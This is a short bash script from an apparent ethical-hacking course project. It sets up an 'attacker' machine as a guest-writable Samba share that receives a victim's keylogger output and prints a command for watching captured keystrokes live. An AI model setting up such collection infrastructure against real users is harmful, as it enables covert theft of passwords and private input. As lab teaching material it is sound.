#!/bin/bash
# setup_attacker.sh — CSCI369 Ethical Hacking Project
# Run this on the ATTACKER machine to set up the Samba share.
# Educational use only. Run only in authorized lab environments.

set -e

SHARE_DIR="/srv/logs_from_victim"
SHARE_NAME="logs"

echo "[*] Updating package list..."
sudo apt update -q

echo "[*] Installing Samba..."
sudo apt install -y samba

echo "[*] Creating shared directory: $SHARE_DIR"
sudo mkdir -p "$SHARE_DIR"
sudo chmod 777 "$SHARE_DIR"
sudo chown nobody:nogroup "$SHARE_DIR"

echo "[*] Configuring Samba share..."
CONF_BLOCK="
[$SHARE_NAME]
   path = $SHARE_DIR
   read only = no
   guest ok = yes
   force user = nobody
"

# Only add the block if it doesn't already exist
if ! grep -q "\[$SHARE_NAME\]" /etc/samba/smb.conf; then
    echo "$CONF_BLOCK" | sudo tee -a /etc/samba/smb.conf > /dev/null
    echo "[+] Samba share block added to smb.conf"
else
    echo "[!] Samba share block already exists in smb.conf — skipping."
fi

echo "[*] Restarting Samba service..."
sudo systemctl restart smbd
sudo systemctl enable smbd

echo ""
echo "[+] Attacker setup complete."
echo "    Share path : $SHARE_DIR"
echo "    Share name : $SHARE_NAME"
echo ""
echo "[*] To monitor keystrokes in real time, run:"
echo "    tail -f $SHARE_DIR/keylog.txt"
